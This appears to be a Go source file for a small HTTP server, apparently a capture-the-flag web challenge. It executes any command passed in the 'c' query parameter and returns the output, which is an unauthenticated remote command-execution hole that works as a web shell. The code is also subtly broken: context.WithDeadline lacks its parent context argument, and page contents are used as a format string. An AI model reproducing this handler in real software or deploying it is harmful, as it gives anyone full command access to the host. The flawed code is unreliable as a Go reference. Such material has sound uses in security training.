package main 

import (
	"context"
	"time"
	"os/exec"
	"strings"
	"net/http"
	"log"
	"fmt"
	"io/ioutil"
)

var (
	html []byte
	err error = nil
)

func handler(w http.ResponseWriter, r *http.Request) {
	var (
		c *exec.Cmd = nil
		b = ""
		cmd = []string{}
	)

	queries := r.URL.Query()
	if strings.Join(queries["c"], "") != "" {
		b = strings.Join(queries["c"], " ")
		cmd = strings.Split(b, " ")
	}

	if len(cmd) != 0 {
		t := time.Now().Add(time.Second*5)
		ctx, cancel := context.WithDeadline(t)
		defer cancel()
		c = exec.CommandContext(ctx, cmd[0], cmd[1:] ...)
		c.Stderr = w
		c.Stdout = w
	} 

	fmt.Fprintf(w, string(html))
	if c != nil {
		err := c.Run()
		log.Println(err)
	}
	fmt.Fprintf(w, "</body></html>")

}

func init() {
	html, err = ioutil.ReadFile("/home/web150/index.html")
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	http.HandleFunc("/", handler)
	log.Fatal(http.ListenAndServe(":4009", nil))
}
